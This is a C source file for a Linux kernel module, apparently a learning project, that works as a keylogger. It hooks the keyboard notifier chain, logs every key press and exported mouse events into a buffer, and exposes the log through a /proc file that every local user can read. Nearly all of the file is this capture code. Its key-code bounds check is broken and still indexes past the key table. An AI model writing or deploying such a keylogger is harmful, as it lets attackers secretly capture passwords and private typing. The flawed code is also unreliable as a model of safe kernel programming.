#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include "my_logger.h"

#define MODULE_INFO_PREFIX "myLogger"
extern int send_mouse_coordinates(char buttons, char dx, char dy, char wheel);

#define DEVICE_NAME "my_logger"
#define MY_LOG_SIZE 2048

static struct proc_dir_entry* our_proc_file;

static int my_log_len;
static char my_log[MY_LOG_SIZE + 32];
static int isShiftKey = 0;


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Obergan T.M");
MODULE_DESCRIPTION("Logging mouse and keyboard");


/* keylogger_notify start */
int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){
    struct keyboard_notifier_param *param = _param;
    char buf[128];
	int len;

    if ( code == KBD_KEYCODE )
    {
        if( param->value==42 || param->value==54 )
        {
            if( param->down )
                isShiftKey = 1;
            else
                isShiftKey = 0;
            return NOTIFY_OK;
        }

        if( param->down )
        {
            // если не предусмотреть выход за границы массива,
            // то система может попросту зависнуть
            if (param->value > MyKeysMax)
                sprintf(buf, "keyboard: id-%d\n", param->value);
            if( isShiftKey == 0 )
                sprintf(buf, "keyboard: %s\n", MyKeys[param->value]);
            else
                sprintf(buf, "keyboard: shift + %s\n", MyKeys[param->value]);

            len = strlen(buf);
            if(len + my_log_len >= MY_LOG_SIZE)
            {
                memset(my_log, 0, MY_LOG_SIZE);
                my_log_len = 0;
            }
            strcat(my_log, buf);
            my_log_len += len; 
        }
    }
    
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};
/* keylogger_notify end */


/* procf start */
int procfs_open(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "%s in procfs_open\n", MODULE_INFO_PREFIX);
    try_module_get(THIS_MODULE);
    return 0;
}

static ssize_t procfs_read(struct file *filp, char *buffer, size_t length, loff_t * offset)
{
    static int ret = 0;
    printk(KERN_INFO "%s in procfs_read\n", MODULE_INFO_PREFIX);

    if (ret)
        ret = 0;
    else 
    {
        if ( raw_copy_to_user(buffer, my_log, my_log_len) )
            return -EFAULT;

        printk(KERN_INFO "%s read %lu bytes\n", MODULE_INFO_PREFIX, my_log_len);
        ret = my_log_len;
    }
    return ret;
}

static ssize_t procfs_write(struct file *file, const char *buffer, size_t length, loff_t * off)
{
    printk(KERN_INFO "%s in procfs_write\n", MODULE_INFO_PREFIX);
    return 0;
}

int procfs_close(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "%s in procfs_close\n", MODULE_INFO_PREFIX);
    module_put(THIS_MODULE);
    return 0;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = procfs_read,
    .write = procfs_write,
    .open = procfs_open,
    .release = procfs_close,
};
/* procf end */


static int __init procInit( void )
{
    printk(KERN_INFO "%s in init\n", MODULE_INFO_PREFIX);
    
    our_proc_file = proc_create(DEVICE_NAME, 0644 , NULL, &fops);
    if (!our_proc_file)
    {
        printk(KERN_INFO "%s proc_create %s failed\n", MODULE_INFO_PREFIX, DEVICE_NAME);
        return -ENOMEM;
    }
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "%s logger registered\n", MODULE_INFO_PREFIX);
    
    memset(my_log, 0, MY_LOG_SIZE);
	my_log_len = 0;
    
    return 0;
}

static void __exit procExit( void )
{
    printk(KERN_INFO "%s in exit\n", MODULE_INFO_PREFIX);
    
    unregister_keyboard_notifier(&keylogger_nb);
    remove_proc_entry(DEVICE_NAME, NULL);
    printk(KERN_INFO "%s unregistered\n", MODULE_INFO_PREFIX);
}

extern int send_mouse_coordinates(char buttons, char dx, char dy, char wheel)
{
    printk(KERN_INFO "%s received send_mouse_coordinates %d %d %d %d\n", MODULE_INFO_PREFIX, buttons, dx, dy, wheel);
    
    char buf[32];
	int len;
    
    sprintf(buf, "mouse: %d %d %d %d \n", buttons, dx, dy, wheel);

    len = strlen(buf);
    if(len + my_log_len >= MY_LOG_SIZE)
    {
        memset(my_log, 0, MY_LOG_SIZE);
        my_log_len = 0;
    }
    strcat(my_log, buf);
    my_log_len += len;
    
    return 0;
}
EXPORT_SYMBOL(send_mouse_coordinates);

module_init(procInit);
module_exit(procExit);
